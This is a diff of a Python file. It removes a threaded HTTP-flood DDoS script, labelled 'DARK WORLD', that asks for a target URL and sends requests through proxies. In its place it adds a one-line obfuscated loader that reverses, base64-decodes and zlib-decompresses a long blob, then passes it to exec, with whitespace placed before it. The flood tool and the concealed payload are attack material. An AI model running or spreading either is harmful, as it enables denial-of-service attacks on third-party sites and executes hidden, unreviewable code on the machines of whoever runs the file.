@@ -1,38 +1,4 @@
-import requests
-import threading
 
-# Function to send HTTP requests
-def send_request(url, proxy=None):
-    while True:
-        try:
-            response = requests.get(url, proxies=proxy)
-            print(f"Sent request to {url}")
-        except requests.exceptions.RequestException as e:
-            print(f"Error sending request to {url}: {e}")
-
-# Main function
-def main():
-    # Display banner
-    print("DARK WORLD")
-    print("Creator: Rahad Hasan")
-
-    # Get the target URL from the user
-    target_url = input("Enter the target URL: ")
-
-    # Define the proxy URLs
-    proxy_urls = ["http://12.345.678.90:8080", "http://98.76.54.32:8080"]
-
-    # Create a list of proxy dictionaries
-    proxies = [{"http": proxy_url, "https": proxy_url} for proxy_url in proxy_urls]
-
-    # Start the DDoS attack
-    print("Starting DDoS attack...")
-    for _ in range(10000):
-        # Create a new thread for each request
-        for proxy in proxies:
-            thread = threading.Thread(target=send_request, args=(target_url, proxy))
-            thread.start()
-
-# Run the script when executed as the main program
-if __name__ == "__main__":
-    main()
+# Mara Kha
+                    
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
